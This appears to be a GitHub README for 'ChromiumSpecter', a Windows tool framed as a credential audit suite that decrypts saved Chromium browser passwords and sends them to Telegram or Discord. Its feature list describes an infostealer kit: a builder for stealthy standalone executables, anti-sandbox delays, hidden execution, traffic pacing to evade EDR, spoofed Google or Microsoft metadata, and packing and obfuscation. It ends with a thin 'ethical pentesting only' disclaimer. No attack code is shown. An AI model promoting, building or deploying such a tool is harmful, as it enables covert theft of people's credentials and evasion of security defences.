# 🛡️ ChromiumSpecter Auditor Suite

> [!NOTE]
> **English Version** | [Versión en Español](README.md)

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*The ultimate tactical-grade suite for Chromium-based browser security audits.*

[Report Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Request Feature](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)

</div>

---

## 💻 Capability Overview

**ChromiumSpecter** is a credential auditing suite designed for Windows environments, focusing on discretion, automation, and operational ergonomics. It allows extracting, decrypting, and exfiltrating data from Chromium-based browsers (v80+) using a modular and resilient architecture.

### 🌟 Key Features

*   **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and results management using optimized widget pools.
*   **🕵️ Tactical Stealth Engine**:
    *   **Startup Delay**: Initial delay selector (0-300s) to evade Sandbox and smart-sandbox analysis.
    *   **Inter-file Delay (`send_delay`)**: Customizable pauses between transmissions to prevent traffic bursts that alert firewalls or EDRs.
    *   **Startup Hidden**: Option to run the binary without a console and in a completely invisible manner.
*   **🚀 Smart Exfiltration**:
    *   **Auto-Exfiltrate**: Configuration for immediate automatic sending after the audit.
    *   **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
    *   **Local Persistence**: Secure saving of exfiltration configurations for recurring use.
*   **🛠️ Integrated Visual Builder**:
    *   Custom stub generation with **Dynamic Parameter Injection**.
    *   **Metadata Spoofing**: Integrated presets (Google, Microsoft, Intel) to clone legitimate executable signatures.
    *   **Compression and Obfuscation**: Native support for UPX and hybrid obfuscation layers.

---

## 🚀 Tactical Workflow

1.  **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
2.  **Audit**: Launch the scan from the Dashboard. You can activate **Auto-exfiltration** to automate the entire cycle.
3.  **Inspection**: View decrypted credentials in real-time in the **Results** Tab.
4.  **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.

---

## ⚙️ Compilation Parameters (Stub)

When using the **Builder**, you can inject the following behaviors into your final binary:

| Parameter | Range / Option | Purpose |
| :--- | :--- | :--- |
| **Startup Delay** | 0s - 300s | Delay before the first action (Anti-Sandbox). |
| **Send Delay** | 0s - 10s | Pause between sent files (Traffic evasion). |
| **Webhook Timeout**| 5s - 60s | Connection timeout for unstable networks. |
| **Auto-Exfiltrate**| Checkbox | Enables automatic sending without intervention. |
| **UAC Prompt** | Toggle | Requests admin privileges if necessary. |

---

## 🛠️ Technology Stack

| Component | Technology |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Cryptography** | `AES-GCM 256` via `PyCryptodomex` |
| **OS Security** | `Windows DPAPI` / `Win32 API` |
| **Compilation** | `PyInstaller` + `UPX` |
| **Persistence** | Local `JSON` (.audit/exfil_config.json) |

---

## ⚙️ Installation Guide

```bash
# 1. Clone the repository
git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
cd decrypt-chromium-suite

# 2. Install dependencies
pip install -r requirements.txt

# 3. Launch the Dashboard
python gui_app.py
```

---

## 📡 Exfiltration Setup

### 🤖 Telegram
Requires **Token** and **Chat ID**.
*   Get the token from `@BotFather`.
*   Get your ID from `@userinfobot`.

### 🎮 Discord
Requires **Webhook URL**.
*   Configure it in: Channel Settings -> Integrations -> Webhooks.

---

## ⚖️ Legal and Ethical Notice

> [!CAUTION]
> **THIS SOFTWARE IS FOR ETHICAL PENTESTING AND PROFESSIONAL AUDITING PURPOSES ONLY.**
> Using this tool to access systems without the explicit authorization of the owner is illegal. The author assumes no responsibility for any misuse of this suite.

---
